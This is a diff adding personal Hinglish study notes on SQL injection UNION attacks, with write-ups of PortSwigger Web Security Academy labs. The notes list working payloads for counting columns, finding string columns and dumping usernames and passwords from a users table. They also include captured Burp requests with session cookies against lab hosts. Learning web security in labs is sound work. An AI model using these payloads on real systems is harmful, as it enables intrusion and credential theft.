@@ -1,0 +1,172 @@
+#SQL injection UNION attacks
+  UNION SQL Injection me attacker UNION keyword use karke original query ke sath dusri query ka data bhi nikal leta hai.
+Isse database ke dusre tables ka sensitive data (username, password, email) access ho sakta hai.
+Example:
+SELECT a,b FROM table1 UNION SELECT c,d FROM table2
+Bachav ke liye input validation aur prepared statements use karte hain.
+
+UNION attack tabhi kaam karta hai jab dono queries me same number of columns ho.
+Saath hi columns ka data type compatible hona chahiye (text ke jagah text, number ke jagah number).
+Attack karne ke liye pehle attacker check karta hai ki original query kitne columns return kar rahi hai.
+Fir wo dekhte hai kaunsi column injected data ko show kar sakti hai.
+
+#Determining the number of columns required
+UNION attack ke liye pehle pata karna padta hai ki query me kitne columns hain.
+
+Iske liye attacker ORDER BY use karta hai:
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+Jab column number limit se zyada hota hai, database error deta hai.
+Error ya response change dekhkar attacker samajh jata hai ki total kitne columns return ho rahe hain.
+Example:-
+http://example.com/products?id=5' ORDER BY 1--
+http://example.com/products?id=5' ORDER BY 2--
+
+Dusra method: UNION SELECT NULL payloads se columns ka number check karna.
+
+Example:
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+Agar NULLs ka number original query ke columns se match nahi karta → error aata hai.
+NULL har data type me compatible hota hai → column type mismatch ka problem nahi.
+Jab NULLs ka number match karta hai → database extra row return karta hai (sab NULL values ke saath).
+HTTP response me effect alag ho sakta hai: extra row dikh sakti hai, error aa sakta hai, ya response same reh sakta hai.
+
+#SQLi Lab-3
+SIMPLE THA BS ITNA HI CHANGE KRA MAINE BURP SUIT PE
+GET /filter?category=Clothing%2c+shoes+and+accessories%27%20UNION+SELECT+NULL,NULL,NULL-- HTTP/2
+Host: 0a7100f104ee1533809271fe00290013.web-security-academy.net
+Cookie: session=EVamMjytbgSTzwCHS7ihmXAK8l5cnGQo
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+Payload:- '+UNION+SELECT+NULL,NULL,NULL--
+
+#Database-specific syntax
+Oracle database me har SELECT query me FROM clause chahiye.
+
+Matlab: SELECT something alone kaam nahi karega, table ya dual specify karni padti hai.
+
+Example:
+
+' UNION SELECT NULL FROM DUAL--
+
+→ DUAL ek dummy table hai, sirf Oracle me use hota hai.
+
+MySQL me FROM compulsory nahi hota agar simple expressions return kar rahe ho.
+Comments (-- ya #):
+SQL injection me original query ke baad ka part ignore karne ke liye use hota hai.
+MySQL: -- (space zaruri) ya #
+Oracle: -- (space optional)
+
+#Finding columns with a useful data type
+Goal: SQL injection me wo column find karna jo string data store kar sake.
+Process:
+Pehle column count pata karo.
+
+Fir har column me ek string try karo using UNION SELECT:
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+Agar column string compatible hai → extra row ya response me string dikhegi.
+Agar error aata hai (jaise varchar to int conversion failed) → wo column number compatible nahi hai.
+Tip: Jo column string accept karta hai, wahi aage sensitive data retrieve karne ke liye use hota hai.
+
+
+#LAB-4
+GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,'R38lDI',NULL-- HTTP/2
+Host: 0a3c00f304045a6b80150dba00280007.web-security-academy.net
+Cookie: session=66CbqQg48jg1LvAbY672HMJfGSbwOmDs
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+PAYLOAD:- '+UNION+SELECT+NULL,NULL,NULL--
+'+UNION+SELECT+NULL,'R38lDI',NULL--
+
+#Using a SQL injection UNION attack to retrieve interesting data
+Pehle pata karo original query kitne columns return karti hai.
+Dekho kaunse columns string data le sakte hain.
+Agar table users hai aur columns username & password, injection yeh hoga:
+' UNION SELECT username, password FROM users--
+Ye WHERE clause me quoted string ke andar use hota hai.
+Agar table/column names nahi pata, pehle database structure check karna padega.
+
+#LAB-5
+maine pahle ' UNION SELECT NULL,NULL-- USE KRKE PTA KRA KI KITNA COLUMN HAI FIR STRINGS KE LIYE ' UNION SELECT 'A','A'-- USE KRKE PTA KRA KI KITNE COULUNS MAI STRINGS HAI
+FIR WHA SE MAINE '+UNION+SELECT+username,+password+FROM+users-- USE KARKE ADMINISTRATOR KA USERNAME AUR PASS NIKAL LIYA
+PAYLOADS :- ' UNION SELECT NULL,NULL--
+' UNION SELECT 'A','A'-- 
+'+UNION+SELECT+username,+password+FROM+users--
+
+#Retrieving multiple values within a single column
+Column & type identify karna
+
+Pehle original query ke columns count karo.
+Check karo kaunse columns string le sakte hain.
+
+Basic UNION attack
+
+Agar table users hai aur columns username & password:
+' UNION SELECT username, password FROM users--
+Injection quoted string ke andar use hota hai.
+
+Single column me multiple values
+
+Agar query sirf 1 column return kare:
+Oracle: username || '~' || password
+MySQL: CONCAT(username, '~', password)
+Separator (~) se values distinguish hoti hain.
+Example: ' UNION SELECT username || '~' || password FROM users--
+
+
+LAB-6
+GET /filter?category=Accessories'+UNION+SELECT+NULL,username||+'~'+||password+FROM+users-- HTTP/2
+Host: 0ab6000c0352822380248abe0090002b.web-security-academy.net
+Cookie: session=0rwutW3dZUoFq1OMvnDGVlkmR7hY3lqx
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+PAYLOAD:- ' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,'A'--
+'+UNION+SELECT+NULL,username||+'~'+||password+FROM+users--
+pahle maine payload dalkar numbers pta kra column ka fir ya pta kra ki kisme strings hai fir maine payload ka use karke adminstrator ka pass pta kra aur login kr lia 
+
+#Examining the database in SQL injection
+Exploit karne ke liye database ki info pata karna zaruri hai.
+Yeh info include karta hai:
+Type aur version of database software.
+Tables aur columns jo database me hain.
+
+
